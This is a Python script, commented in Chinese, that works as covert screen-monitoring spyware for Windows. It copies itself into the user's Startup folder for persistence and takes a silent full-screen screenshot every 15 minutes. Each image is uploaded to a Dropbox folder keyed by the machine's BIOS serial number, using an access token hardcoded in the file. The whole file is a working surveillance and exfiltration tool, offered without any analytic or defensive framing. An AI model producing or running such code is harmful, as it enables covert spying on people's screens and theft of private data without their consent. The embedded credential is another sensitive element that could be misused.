import os
import time
import dropbox
import subprocess
import platform
from datetime import datetime
from PIL import ImageGrab  # 用于截屏
import shutil
import sys

# Dropbox Access Token (替换为你的 Token)
DROPBOX_ACCESS_TOKEN = 'sl.B_Xlb3aYfnkQUZrCPKqWqb8jdI91E_HXIrbkf6vb62EZ-hRVUrCQFEBvjyVSpt7vKYsvNiueyijKU3CrMHp4S-Hccc6bL7ELiJabRyNt6MTWggPBx3zSdpRDW_f8PvnvjdjurBhzFrTE'

# Dropbox 应用文件夹
DROPBOX_APP_FOLDER = '/everau monitor/'

# 获取本机序列号
def get_serial_number():
    try:
        if platform.system() == "Windows":
            command = "wmic bios get serialnumber"
            serial_number = subprocess.check_output(command, shell=True).decode().split("\n")[1].strip()
        else:
            serial_number = "unknown_serial"
    except Exception as e:
        print(f"无法获取序列号: {e}")
        serial_number = "unknown_serial"
    return serial_number

# 上传文件到 Dropbox
def upload_to_dropbox(file_path, folder_name, dbx_token):
    try:
        dbx = dropbox.Dropbox(dbx_token)
        with open(file_path, 'rb') as f:
            dropbox_path = f"{DROPBOX_APP_FOLDER}{folder_name}/{os.path.basename(file_path)}"
            dbx.files_upload(f.read(), dropbox_path)
        print(f"文件上传成功: {dropbox_path}")
    except Exception as e:
        print(f"上传到 Dropbox 时出错: {e}")

# 截取屏幕并保存为图片
def take_screenshot(folder_path):
    if not os.path.exists(folder_path):
        os.makedirs(folder_path)
    
    timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
    screenshot_path = os.path.join(folder_path, f"screenshot_{timestamp}.png")
    
    # 截屏并保存
    try:
        img = ImageGrab.grab()  # 这个会在后台静默进行
        img.save(screenshot_path)
        print(f"截图保存: {screenshot_path}")
        return screenshot_path
    except Exception as e:
        print(f"截取屏幕失败: {e}")
        return None

# 将脚本添加到 Windows 启动项
def add_to_startup():
    startup_path = os.path.join(os.path.expanduser("~"), "AppData", "Roaming", "Microsoft", "Windows", "Start Menu", "Programs", "Startup")
    script_path = sys.argv[0]
    startup_script_path = os.path.join(startup_path, os.path.basename(script_path))
    
    if not os.path.exists(startup_script_path):
        shutil.copy(script_path, startup_script_path)
        print(f"脚本已添加到启动项: {startup_script_path}")
    else:
        print("脚本已在启动项中。")

def main():
    add_to_startup()  # 在首次运行时添加到启动项
    dbx_token = DROPBOX_ACCESS_TOKEN
    serial_number = get_serial_number()  # 获取本机的序列号作为文件夹名
    folder_name = serial_number

    # 本地截图保存的文件夹
    local_screenshot_folder = os.path.join(os.getcwd(), "screenshots")

    while True:
        screenshot_path = take_screenshot(local_screenshot_folder)
        if screenshot_path:
            upload_to_dropbox(screenshot_path, folder_name, dbx_token)
        else:
            print("截图失败，重试中...")
            time.sleep(5)  # 如果截图失败，等待5秒后重试

        # 每隔15分钟（900秒）
        time.sleep(900)

if __name__ == "__main__":
    main()
